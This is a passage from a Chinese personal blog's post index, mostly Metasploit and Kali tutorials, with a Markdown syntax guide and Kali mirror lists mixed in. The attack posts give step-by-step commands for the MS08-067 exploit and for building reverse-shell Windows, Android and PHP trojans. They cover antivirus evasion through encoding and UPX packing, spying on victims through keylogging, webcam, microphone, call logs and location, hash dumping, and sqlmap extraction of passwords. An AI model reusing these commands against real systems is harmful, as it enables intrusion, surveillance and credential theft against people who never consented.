Chinese - Traditional / Taiwan (NX) 10 Windows XP SP2 Chinese - Simplified (NX) 11 Windows XP SP2 Chinese - Traditional (NX) 12 Windows XP SP2 Czech (NX) 13 Windows XP SP2 Danish (NX) 14 Windows XP SP2 German (NX) 15 Windows XP SP2 Greek (NX) 16 Windows XP SP2 Spanish (NX) 17 Windows XP SP2 Finnish (NX) 18 Windows XP SP2 French (NX) 19 Windows XP SP2 Hebrew (NX) 20 Windows XP SP2 Hungarian (NX) 21 Windows XP SP2 Italian (NX) 22 Windows XP SP2 Japanese (NX) 23 Windows XP SP2 Korean (NX) 24 Windows XP SP2 Dutch (NX) 25 Windows XP SP2 Norwegian (NX) 26 Windows XP SP2 Polish (NX) 27 Windows XP SP2 Portuguese - Brazilian (NX) 28 Windows XP SP2 Portuguese (NX) 29 Windows XP SP2 Russian (NX) 30 Windows XP SP2 Swedish (NX) 31 Windows XP SP2 Turkish (NX) 32 Windows XP SP3 Arabic (NX) 33 Windows XP SP3 Chinese - Traditional / Taiwan (NX) 34 Windows XP SP3 Chinese - Simplified (NX) 35 Windows XP SP3 Chinese - Traditional (NX) 36 Windows XP SP3 Czech (NX) 37 Windows XP SP3 Danish (NX) 38 Windows XP SP3 German (NX) 39 Windows XP SP3 Greek (NX) 40 Windows XP SP3 Spanish (NX) 41 Windows XP SP3 Finnish (NX) 42 Windows XP SP3 French (NX) 43 Windows XP SP3 Hebrew (NX) 44 Windows XP SP3 Hungarian (NX) 45 Windows XP SP3 Italian (NX) 46 Windows XP SP3 Japanese (NX) 47 Windows XP SP3 Korean (NX) 48 Windows XP SP3 Dutch (NX) 49 Windows XP SP3 Norwegian (NX) 50 Windows XP SP3 Polish (NX) 51 Windows XP SP3 Portuguese - Brazilian (NX) 52 Windows XP SP3 Portuguese (NX) 53 Windows XP SP3 Russian (NX) 54 Windows XP SP3 Swedish (NX) 55 Windows XP SP3 Turkish (NX) 56 Windows 2003 SP1 English (NO NX) 57 Windows 2003 SP1 English (NX) 58 Windows 2003 SP1 Japanese (NO NX) 59 Windows 2003 SP1 Spanish (NO NX) 60 Windows 2003 SP1 Spanish (NX) 61 Windows 2003 SP1 French (NO NX) 62 Windows 2003 SP1 French (NX) 63 Windows 2003 SP2 English (NO NX) 64 Windows 2003 SP2 English (NX) 65 Windows 2003 SP2 German (NO NX) 66 Windows 2003 SP2 German (NX) 67 Windows 2003 SP2 Portuguese - Brazilian (NX) 68 Windows 2003 SP2 Spanish (NO NX) 69 Windows 2003 SP2 Spanish (NX) 70 Windows 2003 SP2 Japanese (NO NX) 71 Windows 2003 SP2 French (NO NX) 72 Windows 2003 SP2 French (NX) 设置target IDmsf exploit(ms08_067_netapi) &gt; set target 17 target =&gt; 11 11.再一次确认配置信息是否设置完成 msf exploit(ms08_067_netapi) &gt; show options Module options (exploit/windows/smb/ms08_067_netapi): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST 192.168.43.176 yes The target address RPORT 445 yes Set the SMB service port SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC) Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none) LHOST 192.168.43.236 yes The listen address LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 11 Windows XP SP2 Chinese - Traditional (NX) 12.开始进攻 msf exploit(ms08_067_netapi) &gt; exploit","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"meterpreter","slug":"meterpreter","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/meterpreter/"},{"name":"Metasploit","slug":"Metasploit","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Metasploit/"},{"name":"MS08-067","slug":"MS08-067","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/MS08-067/"}]},{"title":"Metasploit远程控制木马","slug":"Metasploit远程控制木马","date":"2019-01-13T22:05:30.000Z","updated":"2019-01-14T01:52:18.565Z","comments":true,"path":"2019/01/14/Metasploit远程控制木马/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Metasploit远程控制木马/","excerpt":"","text":"Metasploit远程控制软件，及木马的使用 基础小知识：木马：- 1. 控制端（控制程序） - 2.服务端（木马程序）so 要进行木马攻击必须要先根据自己的IP生成一个木马 1.打开终端，输入 msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.43.80 LPORT=55555 X &gt; test.exe ‘X’ —-以二进制显示出来‘&gt;’ —-“写”的意思生成一个木马程序test.exe 更新了kali了，现在已经没有msfpayload的命令了，换成msfvenom了。里面集成了msfpayload和msfencode kali2.0之后的可以使用以下命令 msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\\x00’ LHOST=192.168.1.113 LPORT=443 -f exe &gt; abc.exe // -p payload -e 编码方式 -i 编码次数 -b 在生成的程序中避免出现的值 LHOST,LPORT 监听上线的主机IP和端口 -f exe 生成EXE格式 还可以使用UPX加壳，做免杀处理，命令如下 upx -5 /root/Desktop/acn.exe 2.将生成的木马程序发布出去，在根目录下找到即可。现在杀毒软件会发现并将其隔离，如果不想被发现，可以做免杀处理，如果不想做免杀处理，把目标机的杀毒软件关掉就可以拖进去了 3.打开另一个终端，输入 msfconsole 启动metasploit 4.在msf下输入 use exploit/multi/handler 5.查看需要设置的参数 show options 6.设置payload set PAYLOAD windows/meterpreter/reverse_tcp 使用这个shellcode程序 7.查看参数设置 show options 8.设置LHOST，LPORT set LHOST 192.168.43.80 set LPORT 55555 9.执行程序 exploit 生成一个等待连接会话，等待有人点击木马程序，当被攻击者点击之后生成meterpreter &gt; 这样一个等待输入的状态，可以进行一系列邪恶的操作例如查看系统meterpreter &gt; sysinfo 获取shellmeterpreter &gt; shell 先执行msf，后执行木马，如何使用工具 help //查看帮助 1.将自己暂时不用的会话放在后台 background 如何返回刚才的会话sessions -l //查看会话 sessions -i 1 //选择刚才的会话，数字‘1’视情况而定 2.进程注入（木马随时有可能被结束掉） meterpreter &gt; ps //得到要注入的PID进程 经过查看得到桌面管理进程：2036 2004 explorer.exemeterpreter &gt; migrate 2036 //注入 3.远程桌面的开启 meterpreter &gt; run vuc 4.系统文件管理功能 meterpreter &gt; XXXXXX XXXXXX //功能 download //下载文件 edit //编辑文件(vim编辑器的使用) cat //查看文件 mkdir //创建文件 mv //移动文件 rm //删除文件 upload //上传文件 rmdir //删除文件夹 vim编辑器的使用：’i’ 开始编辑 —esc键：退出编辑状态—-shift+：并输入wq（保存并退出） 5.网络和系统操作 meterpreter &gt; XXXXX XXXXX //功能 arp //看arp缓冲表 ifconfig //看IP地址及网卡 getproxy //获取代理 netstat · //查看端口链接 kill +代号 //结束进程（ps查看） ps //查看进程 reboot //重启电脑 reg //修改注册表 shell //获取shell shutdown //关闭电脑 sysinfo //获取电脑信息 6.用户接口操作及摄像头操作 meterpreter &gt; XXXXXX XXXXXX //功能 enumdesktops //用户登录数 keyscan_start //键盘记录开始(第一步) keyscan_dump //键盘记录下载(第二步) keyscan_stop //键盘记录停止(第三步) uictl //获取键盘鼠标控制权(使用方法加“-h”查看) record_mic //音频录制(-d 可以自己设置时间长短，默认1秒) webcam_chat //查看摄像头接口 webcam_list //查看摄像头列表 webcam_stream //摄像头视频获取 getsystem //获取高权限 hashdump //下载hash密文 如何用命令行查看视频与音频文件apt-get install mplayer mplayer XXXXXX(播放文件)","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"meterpreter","slug":"meterpreter","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/meterpreter/"},{"name":"Metasploit","slug":"Metasploit","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Metasploit/"},{"name":"木马","slug":"木马","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/木马/"}]},{"title":"Metasploit的新手知识","slug":"Metasploit的新手知识","date":"2019-01-13T22:04:13.000Z","updated":"2019-01-14T01:52:35.841Z","comments":true,"path":"2019/01/14/Metasploit的新手知识/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Metasploit的新手知识/","excerpt":"","text":"Metasploit的新手知识 exploit模块------漏洞利用(已经发现的漏洞，并做出的攻击模型) payload------shellcode-漏洞利用后执行的代码 1.打开终端，输入 msfconsole 注意要更新为最新apt-get update +更新源 有时候可能需要打开一个什么数据库，按他的提示来就好，如果发现matesploit程序出错了apt-get remove metasploit 再重新安装一下apt-get install metasploit 2.查看帮助，命令 help 或者查看模块show 会看到帮助信息，或者漏洞利用相关的模块（系统/类型/漏洞利用程序） 3.选择漏洞利用模块 use exploit/windows/smb/ms08_067_netapi 4.查看选项信息、参数 show options RHOST为目标IP，RPORT为端口 5.设置执行漏洞完成之后要执行的程序 set PAYLOAD windows/meterpreter/reverse_tcp 6.查看设置选项 show options 设置LHOST（本机IP）、LPORT（本机端口，有默认时可以不用设置） 7.发起攻击 exploit 成功之后会反弹一个会话出来","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Metasploit/"}]},{"title":"Metasploit之安卓渗透","slug":"Metasploit之安卓渗透","date":"2019-01-13T22:03:04.000Z","updated":"2019-01-14T01:52:51.409Z","comments":true,"path":"2019/01/14/Metasploit之安卓渗透/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Metasploit之安卓渗透/","excerpt":"","text":"Metasploit之安卓渗透 过程与之前的生成windows木马的较为相似 1.终端 msfpayload android/meterpreter/reverse_tcp LHOST=192.168.43.80 LPORT=55555 R &gt; test.apk //生成一个安卓木马，导入手机并安装，生成的木马文件在目录下。 msfconsole //打开msf控制台 更新了kali了，现在已经没有msfpayload的命令了，换成msfvenom了。里面集成了msfpayload和msfencode kali2.0之后的可以使用以下命令 msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\\x00’ LHOST=192.168.1.113 LPORT=443 -f exe &gt; abc.exe // -p payload -e 编码方式 -i 编码次数 -b 在生成的程序中避免出现的值 LHOST,LPORT 监听上线的主机IP和端口 -f exe 生成EXE格式 还可以使用UPX加壳，做免杀处理，命令如下 upx -5 /root/Desktop/acn.exe 现在怎么生成apk文件，还不太清楚 2.设置好木马的客户端软件 msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set PAYLOAD android/meterpreter/reverse_tcp msf exploit(handler) &gt; set LHOST 192.168.43.80 msf exploit(handler) &gt; set LPORT 55555 msf exploit(handler) &gt; exploit //形成一个等待的会话 3.木马被触发之后，就会得到一个会话 meterpreter &gt; help meterpreter &gt; XXXXX -h //查看帮助 meterpreter &gt; XXXXXX XXXXXX //功能 search -f *.jpg (*.png or *.bmp) //搜索 download 图片名(jpg png bmp) //下载(通过ls查看后即可得到图片名) webcam_snap //手机截图 check_root //检查是否root webcam_stream //手机摄像头监控 dump_calllog //下载电话记录 dump_cuntacts //短信列表 geolocate //获取定位 还有很多命令并没有介绍，通过输入help可以查看有哪些命令可以利用，在相应的命令后面添加上“-h”即可获得对该命令的帮助信息","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Metasploit/"}]},{"title":"Meatsploi之生成webshell及应用","slug":"Meatsploi之生成webshell及应用","date":"2019-01-13T22:01:35.000Z","updated":"2019-01-13T22:02:26.970Z","comments":true,"path":"2019/01/14/Meatsploi之生成webshell及应用/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Meatsploi之生成webshell及应用/","excerpt":"","text":"Meatsploi之生成webshell及应用 1.终端：生成木马,将生成的脚本上传到网站 msfpayload php/meterpreter/reverse_tcp LHOST=192.168.43.80 R &gt;php.exe //生成一个PHP脚本木马 cat //查看文件内容 现在怎么生成PHP木马还不太清楚 更新了kali了，现在已经没有msfpayload的命令了，换成msfvenom了。里面集成了msfpayload和msfencode kali2.0之后的可以使用以下命令 msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\\x00’ LHOST=192.168.1.113 LPORT=443 -f exe &gt; abc.exe // -p payload -e 编码方式 -i 编码次数 -b 在生成的程序中避免出现的值 LHOST,LPORT 监听上线的主机IP和端口 -f exe 生成EXE格式 还可以使用UPX加壳，做免杀处理，命令如下 upx -5 /root/Desktop/acn.exe 2.做一个反弹会话的一个链接 use exploit/multi/handler set LHOST 192.168.43.80 set LPORT 55555 show options exploit 完成一系列设置之后生成一个等待状态的会话，一旦木马被触发，即可获得会话 3.开始你的表演 shell execute -f notepad ...... 做实验的话，可以自己准备一个ftp服务器用来作为生成的木马的目的地，通过另一个操作系统，去访问服务器上的这一文件，完成触发过程","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Metasploit/"}]},{"title":"Markdown语法","slug":"Markdown语法","date":"2019-01-13T21:58:19.000Z","updated":"2019-01-13T22:00:52.118Z","comments":true,"path":"2019/01/14/Markdown语法/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Markdown语法/","excerpt":"","text":"这里直接借用了小书匠的语法介绍（最初用的这个软件） title: 小书匠语法使用手册tags: 小书匠,语法,MARKDOWN,帮助grammar_abbr: truegrammar_table: truegrammar_defList: truegrammar_emoji: truegrammar_footnote: truegrammar_ins: truegrammar_mark: truegrammar_sub: truegrammar_sup: truegrammar_checkbox: truegrammar_mathjax: truegrammar_flow: truegrammar_sequence: truegrammar_plot: truegrammar_code: truegrammar_highlight: truegrammar_html: truegrammar_linkify: truegrammar_typographer: truegrammar_video: truegrammar_audio: truegrammar_attachment: truegrammar_mermaid: truegrammar_classy: truegrammar_cjkEmphasis: truegrammar_cjkRuby: truegrammar_center: truegrammar_align: true grammar_tableExtra: true常用语法 标题12345678910这是 H1 一级标题======这是 H2 二级标题------# 这是 H1 一级标题## 这是 H2 二级标题### 这是 H3 三级标题#### 这是 H4 四级标题##### 这是 H5 五级标题###### 这是 H6 六级标题 快捷键: [ctrl + h] 列表无序列表1234567891011121314151617181920* 项目1 * 子项目1.1 * 子项目1.2 * 子项目1.2.1* 项目2* 项目3+ 项目1 + 子项目1.1 + 子项目1.2 + 子项目1.2.1+ 项目2+ 项目3- 项目1 - 子项目1.1 - 子项目1.2 - 子项目1.2.1- 项目2- 项目3 快捷键: [ctrl + u] 有序列表12345678910111. 项目12. 项目23. 项目3 1. 项目3.1 2. 项目3.21. 项目11. 项目21. 项目3 1. 项目3.1 1. 项目3.2 有序列表起始编号1258. 项目52. 项目6 快捷键: [ctrl + o] 链接123[链接名称](链接地址)[链接名称][1][1] : 链接地址 图片123![名称](链接地址)![名称][1][1] : 链接地址 文字格式1234567**这是文字粗体格式**__这是文字粗体格式__*这是文字斜体格式*_这是文字斜体格式_ 引用12&gt; 第一行引用文字&gt; 第二行引用文字 水平线1*** GFM扩展语法 表格1234First Header | Second Header------------- | -------------Content Cell | Content CellContent Cell | Content Cell 增强型表格123456789|First Header | Second Header |||First Header | Second Header | Third Header||------------- | -------------|-------------|表身1Content Cell | Merge Content Cell||Content Cell | Content Cell| Content Cell|表身2Content Cell | Merge Content Cell||Content Cell | Content Cell| Content Cell|[表格标题] 代码行内代码1`var x = \"hello world\"` 块代码1234```javascriptvar a = \"hello world\";var b = \"good luck\";``` 自动转换成超链接系统将自动根据内容，将地址转换成超链接格式1http://markdown.xiaoshujiang.com HTML1&lt;div class=\"hey\"&gt;Hello world&lt;/div&gt; 支持的html标签 删除线1~~在文字上添加删除线~~ 扩展语法 目录1[toc] 扩展的文字格式1234567++插入的文字++==被记号的文字==上角文字: 19^th^下角文字: H~2~O 印刷字替换系统将自动替换下列文字，转换成排版系统使用的符号1(c) (C) (r) (R) (tm) (TM) (p) (P) +- 缩写定义1234The HTML specificationis maintained by the W3C.*[HTML]: Hyper Text Markup Language*[W3C]: World Wide Web Consortium 待办事项1234-[ ] 未完成事项-[ ] 未完成事项-[x] 完成事项-[X] 完成事项 脚注12脚注[^1x][^1x]: 脚注的用法 定义12345苹果: 一种水果: 一种品牌，计算机，手持设备桔子: 一种水果 公式行内公式1这是行内公式`!$ \\Gamma(z) = \\int_0^\\infty t^&#123;z-1&#125;e^&#123;-t&#125;dt\\,. $` 块公式123```mathjax!$$\\Gamma(z) = \\int_0^\\infty t^&#123;z-1&#125;e^&#123;-t&#125;dt\\,.$$``` 流程图 (语法)12345678910```flowst=&gt;start: 开始e=&gt;end: 结束op=&gt;operation: 操作步骤cond=&gt;condition: 是 或者 否?st-&gt;op-&gt;condcond(yes)-&gt;econd(no)-&gt;op``` 序列图 (语法)12345```sequence小明-&gt;小李: 你好 小李, 最近怎么样?Note right of 小李: 小李想了想小李--&gt;小明: 还是老样子``` 小书匠编辑器扩展语法 块代码内文字格式块代码高亮标记123```javascriptvar &gt;&gt;==hello==&lt;&lt; = 'hello world'``` 块代码删除线123```javascriptvar &gt;&gt;~~hello~~&lt;&lt; = 'hello world'``` 块代码加粗123```javascriptvar &gt;&gt;**hello**&lt;&lt; = 'hello world'``` 块代码下横线123```javascriptvar &gt;&gt;++hello++&lt;&lt; = 'hello world'``` 小书匠编辑器提供了附件管理功能，用户可通过./对附件的引用，比如图片./jiangzhu.jpg。附件的上传需通过工具栏的插入图片ctrl+g，插入视频ctrl+shift+v，插入音频ctrl+shift+a，插入附件ctrl+shift+t功能键进行操作。 视频123%[名称](链接地址)%[名称][1][1] : 链接地址 音频123~[名称](链接地址)~[名称][1][1] : 链接地址 附件123=[名称](链接地址)=[名称][1][1] : 链接地址 元数据元数据必须放置在每篇文章的开头才能生效。如果文章里有元数据时，系统将自动以元数据的标题为准，用户通过文章信息的维护界面修改的标题及tags将会被覆盖掉。1234---title: 小书匠语法使用手册tags: 小书匠,语法,MARKDOWN,帮助--- mermaid流程图，序列图，甘特图（mermaid语法）1234567```mermaid!graph TD;A--&gt;B;A--&gt;C;B--&gt;D;C--&gt;D;``` 统计图 （统计图语法）数据格式为：{&quot;data&quot;: [], &quot;options&quot;:{}}系统使用jquery.parseJSON()函数进行解析，因此代码必须符合该函数的要求才能正常解析。123456```plot!&#123;\"data\": [ [[0, 0], [1, 1]] ],\"options\": &#123; \"yaxis\": &#123; \"max\": 1 &#125; &#125;&#125;``` 自定义class1## 自定义class &#123;class名称&#125; 通过自定义的class名称后，你就可以在每篇文章的自定义css里添加自己想要的样式了． cjk强调1_这里将显示带有衬线字体效果的中文做为强调_ cjk注音标示123&#123;需要被注音标示的内容&#125;(注音标示)&#123;需要被注音标示的内容&#125;[编号][编号]: 注音标示 居中显示文字1-&gt;居中显示的文字&lt;- 对齐显示文字1234:&gt;居左显示的文字&lt;--&gt;居右显示的文字&lt;::&gt;两端对齐显示的文字&lt;:-&gt;居中显示的文字&lt;- 注： 该语法与center语法冲突，两种语法同时开启时，align语法将覆盖center语法。 示例 [toc] http://www.github.com/suziwen/markdownxiaoshujianghttp://www.xiaoshujiang.com 这是 H1 一级标题这是 H2 二级标题这是 H3 三级标题这是 H4 四级标题这是 H5 五级标题这是 H6 六级标题视频%电影 音频~音乐 附件=附件 待办事项-[ ] 未完成事项-[x] 完成事项-[X] 完成事项 缩写定义The HTML specificationis maintained by the W3C. [HTML]: Hyper Text Markup Language [W3C]: World Wide Web Consortium 印刷字替换(c) (C) (r) (R) (tm) (TM) (p) (P) +- html代码html代码 流程图 (语法)12345678st=&gt;start: 开始e=&gt;end: 结束op=&gt;operation: 操作步骤cond=&gt;condition: 是 或者 否?st-&gt;op-&gt;condcond(yes)-&gt;econd(no)-&gt;op 序列图 (语法)123小明-&gt;小李: 你好 小李, 最近怎么样?Note right of 小李: 小李想了想小李--&gt;小明: 还是老样子 脚注^1x表格Tables First Header Second Header Content Cell Content Cell Content Cell Content Cell 定义苹果: 一种水果: 一种品牌，计算机，手持设备 桔子: 一种水果 文字格式这是文字粗体格式 这是文字粗体格式 这是文字斜体格式 这是文字斜体格式 在文字上添加删除线 ++插入的文字++ ==被记号的文字== 上角文字: 19^th^ 下角文字: H~2~O 无序列表 项目1 子项目1.1 子项目1.2 子项目1.2.1 项目2 项目3 有序列表 项目1 项目2 项目3 项目3.1 项目3.2 有序列表起始编号 项目5 项目6 图片链接 链接名称 引用 第一行引用文字第二行引用文字 水平线 代码行内代码var x = &quot;hello world&quot; 块代码123456789101112131415161718192021222324252627282930313233343536/** * @author John Smith &lt;john.smith@example.com&gt; * @version 1.0*/package l2f.gameserver.model;import &gt;&gt;++java.util.ArrayList++&lt;&lt;;&gt;&gt;~~public abstract class L2Character &#123;~~&lt;&lt;&gt;&gt;++public abstract class L2Character extends L2Object &#123;++&lt;&lt; public static final Short ABNORMAL_EFFECT_BLEEDING = 0x0_0_0_1; // not sure public void moveTo(int x, int y, int z) &#123; _ai = null; _log.warning(\"Should not be called\"); if (1 &gt; 5) &#123; return; &#125; &#125; /** Task of AI notification */ @SuppressWarnings( &#123; \"nls\", \"unqualified-field-access\", \"boxing\" &#125;) &gt;&gt;==public class NotifyAITask implements Runnable &#123; private final CtrlEvent _evt; List&lt;String&gt; mList==&lt;&lt; = new ArrayList&lt;String&gt;() public void run() &#123; try &#123; getAI().notifyEvent(_evt, _evt.class, null); &#125; catch (Throwable t) &#123; t.printStackTrace(); &#125; &#125; &#125;&#125; 块代码内文字格式块代码高亮标记1var &gt;&gt;==hello==&lt;&lt; = 'hello world' 块代码删除线1var &gt;&gt;~~hello~~&lt;&lt; = 'hello world' 块代码加粗1var &gt;&gt;**hello**&lt;&lt; = 'hello world' 块代码下横线1var &gt;&gt;++hello++&lt;&lt; = 'hello world' 显示行号12var x = 1;var z = &apos;str&apos;; 高亮指定行123456var x = 1;var y = 2;var z = 3;var u = 4;var w = 5;var a = 6; 显示行号并从指定行数计数1var x = 1; 禁用显示行号1var x = 1; 公式行内公式这是行内公式!$ \\Gamma(z) = \\int_0^\\infty t^{z-1}e^{-t}dt\\,. $ 块公式1$$\\Gamma(z) = \\int_0^\\infty t^&#123;z-1&#125;e^&#123;-t&#125;dt\\,.$$ 带编号的公式!$\\eqref{ref1}$ 123\\begin&#123;equation&#125;\\int_0^\\infty \\frac&#123;x^22&#125;&#123;e^x-1&#125;\\,dx = \\frac&#123;\\pi^4&#125;&#123;15&#125;\\label&#123;ref1&#125;\\end&#123;equation&#125; !$\\eqref{ref1}$ 统计图1234&#123;&quot;data&quot;: [ [[0, 0], [1, 1]] ],&quot;options&quot;: &#123; &quot;yaxis&quot;: &#123; &quot;max&quot;: 1 &#125; &#125;&#125; mermaid流程图，序列图，甘特图流程图12345graph TD; A--&gt;B; A--&gt;C; B--&gt;D; C--&gt;D; 序列图123456sequenceDiagramA-&gt;&gt; B: QueryB-&gt;&gt; C: Forward queryNote right of C: Thinking...C-&gt;&gt; B: ResponseB-&gt;&gt; A: Forward response 甘特图123456789101112131415gantt dateFormat YYYY-MM-DD title Adding GANTT diagram functionality to mermaid section A section Completed task :done, des1, 2014-01-06,2014-01-08 Active task :active, des2, 2014-01-09, 3d Future task : des3, after des2, 5d Future task2 : des4, after des3, 5d section Critical tasks Completed task in the critical line :crit, done, 2014-01-06,24h Implement parser and jison :crit, done, after des1, 2d Create tests for parser :crit, active, 3d Future task in critical line :crit, 5d Create tests for renderer :2d Add to mermaid :1d PPT语法使用12---- 作为一个水平页分割线，注意在----前后都需要空一行 使用12-- 作为一个垂直页分割线, 注意在--前后都需要空一行 通过如下形式1&lt;!-- .element: class=&quot;fragment&quot; data-fragment-index=&quot;1&quot; --&gt; 可以实现fragment显示效果 注： 在演示文档模式下，toc和脚注语法将失效. emoji表情语法 Classic markup: :wink: :crush: :cry: :tear: :laughing: :yum: Shortcuts (emoticons): :-) :-( 8-) ;) 自定义class自定义class用例{green}你可以通过查看生成的html代码里，在h4里找到名为green的class名称． cjk强调这里将显示中文衬线字体做为强调样式cjk注音标示{小}(xiao){书}(shu){匠}(jiang) 居中显示-&gt;居中显示的{文字}(wenzi)&lt;- -&gt;&lt;- 文字对齐:&gt;居左显示的文字&lt;- -&gt;居右显示的文字&lt;: :&gt;两端对齐显示的文字&lt;: -&gt;居中显示的文字&lt;- 增强型表格|First Header | Second Header |||First Header | Second Header | Third Header||————- | ————-|————-|表身1Content Cell | Merge Content Cell||Content Cell | Content Cell| Content Cell| 表身2Content Cell | Merge Content Cell||Content Cell | Content Cell| Content Cell|[表格标题]","categories":[{"name":"markdown语法","slug":"markdown语法","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/markdown语法/"}],"tags":[{"name":"MARKDOWN","slug":"MARKDOWN","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/MARKDOWN/"}]},{"title":"Kali安装后更新配置","slug":"Kali安装后更新配置","date":"2019-01-13T21:53:08.000Z","updated":"2019-01-13T21:55:40.070Z","comments":true,"path":"2019/01/14/Kali安装后更新配置/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Kali安装后更新配置/","excerpt":"","text":"使用官方的更新源使自己的Kali更加强大 1.在百度上找到Kali的更新源（自己决定用哪些就好） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253# kali官方源deb http://http.kali.org/ moto main non-free contrib deb-src http://http.kali.org/ moto main non-free contribdeb http://security.kali.org/ moto/updates main contrib non-free deb-src http://security.kali.org/ moto/updates main contrib non-free#中科大kali源 deb http://mirrors.ustc.edu.cn/kali kali main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali main non-free contrib deb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free#新加坡kali源 deb http://mirror.nus.edu.sg/kali/kali/ kali main non-free contrib deb-src http://mirror.nus.edu.sg/kali/kali/ kali main non-free contrib deb http://security.kali.org/kali-security kali/updates main contrib non-free deb http://mirror.nus.edu.sg/kali/kali-security kali/updates main contrib non-free deb-src http://mirror.nus.edu.sg/kali/kali-security kali/updates main contrib non-free#阿里云kali源 deb http://mirrors.aliyun.com/kali kali main non-free contrib deb-src http://mirrors.aliyun.com/kali kali main non-free contrib deb http://mirrors.aliyun.com/kali-security kali/updates main contrib non-free#163 Kali源 deb http://mirrors.163.com/debian wheezy main non-free contrib deb-src http://mirrors.163.com/debian wheezy main non-free contrib deb http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib deb-src http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib deb-src http://mirrors.163.com/debian-security wheezy/updates main non-free contrib deb http://mirrors.163.com/debian-security wheezy/updates main non-free contrib #auto deb http://http.kali.org/kali kali-rolling main non-free contrib#中科大 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#浙大 deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free#东软大学 deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib#重庆大学 deb http://http.kali.org/kali kali-rolling main non-free contrib deb-src http://http.kali.org/kali kali-rolling main non-free contrib#官方源 #deb http://http.kali.org/kali kali-rolling main non-free contrib #deb-src http://http.kali.org/kali kali-rolling main non-free contrib 2.打开一个文档的命令：Leafpad 或者 vim 3.用命令行打开etc/apt/sources.list 文件 4.将更新源的内容复制到锁打开的文件夹中 5.使用安装命令安装更新 apt-get update apt-get install apt-get dist-upgrade 具体使用的一些命令安装过程中命令行会进行提示","categories":[{"name":"系统及软件配置","slug":"system-software","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/system-software/"}],"tags":[{"name":"KALI","slug":"KALI","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/KALI/"},{"name":"更新源","slug":"更新源","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/更新源/"}]},{"title":"Kali数据库注入","slug":"Kali数据库注入","date":"2019-01-13T21:47:20.000Z","updated":"2019-01-13T21:49:29.354Z","comments":true,"path":"2019/01/14/Kali数据库注入/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Kali数据库注入/","excerpt":"","text":"基于Kali的SQLMAP数据库注入 1.打开终端，输入 sqlmap -u &quot;网址&quot; #### 检测是否具有漏洞 2.检查一下是否具有dba权限 sqlmap -u &quot;网址&quot; --is-dba 3.列出所有数据库 sqlmap -u &quot;网址&quot; --dba 4.查找数据库 sqlmap -u &quot;&quot; --current -db 5.猜解表名，根据上一步得出的数据库 sqlmap -u &quot;网址&quot; -tables -D &quot;数据库名（上一步得出的）&quot; 6.查询列名 sqlmap -u &quot;网址&quot; --columns -T &quot;上一步得出的表名&quot; -D &quot;数据库名&quot; 7.查询字段，获取用户名与密码 sqlmap -u &quot;网址&quot; --dump -C &quot;username,password&quot; -T &quot;上一步得到的表名&quot; -D 